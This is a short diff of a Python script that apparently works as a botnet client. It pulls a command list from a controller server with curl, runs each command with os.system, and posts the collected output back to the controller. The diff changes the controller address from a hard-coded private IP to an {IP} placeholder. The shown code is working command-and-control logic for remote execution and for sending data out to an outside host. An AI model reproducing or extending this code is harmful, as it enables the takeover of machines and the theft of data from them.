@@ -63,7 +63,6 @@ def instructions():
 	header = "echo 'From Bot #"+myname+" on "+current_date+" at "+current_time+" ' >> sendthis.txt"
 	os.system('curl http://10.0.2.15:8080/instructions.txt > response.txt')
 	os.system(header)
-
 	with open('response.txt') as input_file:
 		send = 0
 		for line in input_file:
@@ -80,10 +79,10 @@ def instructions():
 				os.system(mycommand)
 		if send == 1:
 			os.system("echo 'End Tasks' >> sendthis.txt")
-			os.system('curl --data-binary @./sendthis.txt http://10.0.2.15:8080/instructions.txt')
+			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
 		elif send == 0:
 			os.system("echo 'Status is Online' >> sendthis.txt")
-			os.system('curl --data-binary @./sendthis.txt http://10.0.2.15:8080/logs.txt')
+			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/logs.txt')
 	os.system('rm sendthis.txt response.txt')
 
 
